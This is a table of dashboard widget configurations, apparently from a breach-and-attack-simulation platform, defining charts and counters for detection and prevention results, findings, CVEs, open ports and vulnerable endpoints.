aa3c5dca-311b-447b-acfc-fc9b59a12cdd	SECURITY_COVERAGE_CHART	{"end": null, "mode": "structural", "field": "base_attack_patterns_side", "limit": 100, "start": null, "title": "Detection coverage", "series": [{"name": "SUCCESS", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "and", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "and", "values": ["SUCCESS"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "and", "values": ["DETECTION"], "operator": "eq"}]}}, {"name": "FAILED", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "and", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "and", "values": ["FAILED"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "and", "values": ["DETECTION"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_updated_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 10, "widget_layout_w": 12, "widget_layout_x": 0, "widget_layout_y": 25}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.164761+00	2026-01-09 14:19:32.164777+00
ad073733-201e-4a8d-9700-b7b7cf95ddeb	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 100, "start": null, "title": "Detection", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 0, "widget_layout_y": 0}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.168386+00	2026-01-09 14:19:32.168402+00
baaa2a7b-3bd4-4cf0-8df8-2cbdcdf2ec9a	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_attack_patterns_side", "limit": 10, "start": null, "title": "Most Detected & Prevented TTPs", "series": [{"name": "Detected TTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["SUCCESS"], "operator": "eq"}]}}, {"name": "Prevented TTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["SUCCESS"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 4, "widget_layout_y": 19}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.170047+00	2026-01-09 14:19:32.170062+00
9fd52a35-28ce-468e-b875-210ada1104e6	LIST	{"end": null, "limit": 100, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "Latest simulation", "series": [], "columns": ["name", "status", "base_created_at", "base_tags_side"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 6, "widget_layout_w": 6, "widget_layout_x": 6, "widget_layout_y": 43}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.178411+00	2026-01-09 14:19:32.178433+00
468bc964-5088-4159-b074-812c5f733449	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "finding_type", "limit": 100, "start": null, "title": "Latest findings", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 8, "widget_layout_y": 8}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.180293+00	2026-01-09 14:19:32.180308+00
dd607ac9-9060-4ca3-8392-65f6058c8b2e	NUMBER	{"end": null, "start": null, "title": "Injects", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 8, "widget_layout_y": 2}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.181898+00	2026-01-09 14:19:32.181913+00
a3f4894b-3f54-4721-a176-be2c90208e24	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 100, "start": null, "title": "Prevention", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 2, "widget_layout_y": 0}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.183301+00	2026-01-09 14:19:32.183315+00
bea14709-56ac-4535-a11e-f38a065ef39f	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 100, "start": null, "title": "Prevention", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 2, "widget_layout_y": 0}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.291954+00	2026-01-09 14:19:32.337482+00
4ad8bb7a-edb3-4934-8ecf-43173a869f93	NUMBER	{"end": null, "start": null, "title": "Ports Open", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}, {"key": "finding_type", "mode": "or", "values": ["Port", "PortsScan"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 10, "widget_layout_y": 4}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.275381+00	2026-01-09 14:19:32.327993+00
a5d60fb0-aa15-44dd-83f1-f2f4996ab14d	VERTICAL_BAR_CHART	{"end": null, "mode": "temporal", "start": null, "title": "UNDETECTED/UNPREVENTED INJECTS BY WEEK", "series": [{"name": "Not Detected", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}, {"name": "Not Prevented", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "stacked": false, "interval": "week", "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "temporal-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 0, "widget_layout_y": 17}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.278222+00	2026-01-09 14:19:32.329835+00
4aa6cae3-81ec-445d-b574-4d6b7a3d76bc	LIST	{"end": null, "limit": 100, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "Vulnerable endpoints", "series": [], "columns": ["vulnerable_endpoint_hostname", "base_created_at", "vulnerable_endpoint_agents_active_status", "vulnerable_endpoint_action", "vulnerable_endpoint_findings_summary"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["vulnerable-endpoint"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 5, "widget_layout_w": 12, "widget_layout_x": 0, "widget_layout_y": 12}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.281983+00	2026-01-09 14:19:32.331936+00
ed041cae-e862-4db7-a1db-eb30b135893d	DONUT	{"end": null, "mode": "structural", "field": "vulnerable_endpoint_action", "limit": 100, "start": null, "title": "Recommended action", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["vulnerable-endpoint"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 6, "widget_layout_y": 0}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.284597+00	2026-01-09 14:19:32.333882+00
9ac0b3c8-62a0-4596-a09e-bca8b11fb2c8	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 100, "start": null, "title": "Vulnerability", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["VULNERABILITY"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 4, "widget_layout_y": 0}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.289362+00	2026-01-09 14:19:32.335841+00
c2e97829-ceec-43e0-abf5-f80bc5fe41ad	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 100, "start": null, "title": "Detection", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 0, "widget_layout_y": 0}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.294893+00	2026-01-09 14:19:32.339068+00
8c4266eb-9a08-40df-8eaf-2f3cccbb3017	NUMBER	{"end": null, "start": null, "title": "Simulation", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 8, "widget_layout_y": 0}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.29782+00	2026-01-09 14:19:32.340821+00
8c697877-3e8e-492e-82aa-e3521d17bc4c	NUMBER	{"end": null, "start": null, "title": "CVEs Found", "series": [{"name": "CVEsfound", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "finding_type", "mode": "or", "values": ["CVE"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 10, "widget_layout_y": 2}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.300655+00	2026-01-09 14:19:32.342237+00
65fdbf9d-20be-4045-b6c4-d456a27d2400	NUMBER	{"end": null, "start": null, "title": "Inject", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 8, "widget_layout_y": 2}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.303329+00	2026-01-09 14:19:32.343762+00
cd25964f-bc0f-46fd-b6a9-b58f4ebc034a	LINE	{"end": null, "mode": "temporal", "start": null, "title": "Simulation by week", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "stacked": false, "interval": "week", "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "temporal-histogram"}	{"widget_layout_h": 8, "widget_layout_w": 7, "widget_layout_x": 0, "widget_layout_y": 39}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.307739+00	2026-01-09 14:19:32.345182+00
e724e04b-9d70-487e-b1b4-3d7a7de88982	NUMBER	{"end": null, "start": null, "title": "Total number of findings", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 8, "widget_layout_y": 4}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.312405+00	2026-01-09 14:19:32.346603+00
d8b41b7c-ab05-4304-935b-ebc871ef0212	LIST	{"end": null, "limit": 10, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "Latest simulations", "series": [], "columns": ["name", "base_tags_side", "status", "base_created_at"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 8, "widget_layout_w": 5, "widget_layout_x": 7, "widget_layout_y": 39}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.315911+00	2026-01-09 14:19:32.349452+00
350178c4-e0bf-4143-b603-dd6f4fc222a6	LIST	{"end": null, "limit": 100, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "findings", "series": [], "columns": ["finding_value", "base_created_at", "finding_type"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 8, "widget_layout_w": 8, "widget_layout_x": 0, "widget_layout_y": 4}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.317652+00	2026-01-09 14:19:32.351566+00
0f318c2b-b018-495b-b26b-5d7ec2dd2395	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "finding_type", "limit": 100, "start": null, "title": "Latest findings", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 8, "widget_layout_y": 6}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.319132+00	2026-01-09 14:19:32.353275+00
26daecc8-9b85-4436-9177-bfb6951c2e02	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_attack_patterns_side", "limit": 10, "start": null, "title": "MOST UNDETECTED &UNPREVENTED TTPS", "series": [{"name": "Undetected TTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}, {"name": "UnpreventedTTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 8, "widget_layout_y": 17}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.320583+00	2026-01-09 14:19:32.355006+00
e3cf8d82-ead6-4ba0-8151-8193695338c5	SECURITY_COVERAGE_CHART	{"end": null, "mode": "structural", "field": "base_attack_patterns_side", "limit": 100, "start": null, "title": "LAST DETECTION COVERAGE", "series": [{"name": "SUCCESS", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "and", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "and", "values": ["SUCCESS"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "and", "values": ["DETECTION"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "and", "values": ["a1deeaf1-15d1-419c-a8af-4f9f26920577"], "operator": "eq"}]}}, {"name": "FAILED", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "and", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "and", "values": ["FAILED"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "and", "values": ["DETECTION"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "and", "values": ["a1deeaf1-15d1-419c-a8af-4f9f26920577"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_updated_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 10, "widget_layout_w": 12, "widget_layout_x": 0, "widget_layout_y": 23}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.321856+00	2026-01-09 14:19:32.356858+00
8c89a91e-1ff3-4b25-840e-6167f4c6c02d	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_attack_patterns_side", "limit": 10, "start": null, "title": "Most Detected & Prevented TTPs", "series": [{"name": "Detected TTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["SUCCESS"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}, {"name": "Prevented TTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["SUCCESS"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 4, "widget_layout_y": 17}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.323384+00	2026-01-09 14:19:32.358612+00
9eb3b741-d887-4c7b-a6ee-fe7d591f925e	VERTICAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_security_platforms_side", "limit": 100, "start": null, "title": "Inject undetected & unprevented by security platform", "series": [{"name": "Not Detected", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}]}}, {"name": "Not Prevented", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 12, "widget_layout_x": 0, "widget_layout_y": 33}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.324657+00	2026-01-09 14:19:32.360962+00
c1525271-6d09-4578-9490-dc0fa3ea7ef4	NUMBER	{"end": null, "start": null, "title": "endpoints", "series": [{"name": "endpoints", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["endpoint"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["0a134efb-1dc2-4c00-b9d8-4b58b7c732f5"], "operator": "contains"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 10, "widget_layout_y": 0}	7f92d0b7-3535-4414-80e8-0eed5c2068e0	2026-01-09 14:19:32.325912+00	2026-01-09 14:19:32.36295+00
1436f377-c38e-4fef-b6ef-0a27291f7fb8	NUMBER	{"end": null, "start": null, "title": "Vulnerable endpoints number", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["vulnerable-endpoint"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 10, "widget_layout_y": 0}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.418647+00	2026-01-09 14:19:32.439151+00
96c69fee-0fbc-42b0-82f3-461cdd404327	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "finding_type", "limit": 100, "start": null, "title": "Latest findings", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 8, "widget_layout_y": 6}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.419945+00	2026-01-09 14:19:32.440838+00
8fcbafd3-3c24-4688-b825-a00ee1a83a2f	NUMBER	{"end": null, "start": null, "title": "Ports Open", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "finding_type", "mode": "or", "values": ["Port", "PortsScan"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 10, "widget_layout_y": 4}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.420936+00	2026-01-09 14:19:32.442278+00
f9f81a57-5944-475b-b321-1ab6592f49b9	NUMBER	{"end": null, "start": null, "title": "endpoints", "series": [{"name": "endpoints", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["endpoint"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 8, "widget_layout_y": 2}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.421879+00	2026-01-09 14:19:32.443844+00
d76409da-14dd-4843-8a9e-a8cc96dcf717	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_attack_patterns_side", "limit": 10, "start": null, "title": "Most Detected & Prevented TTPs", "series": [{"name": "Detected TTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["SUCCESS"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}, {"name": "Prevented TTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["SUCCESS"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["9f8061a2-7a8d-4967-8588-64f80e3f87be"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 4, "widget_layout_y": 17}	71de8342-011e-4cac-a8ab-477cb0770756	2026-01-09 14:19:32.422797+00	2026-01-09 14:19:32.44508+00
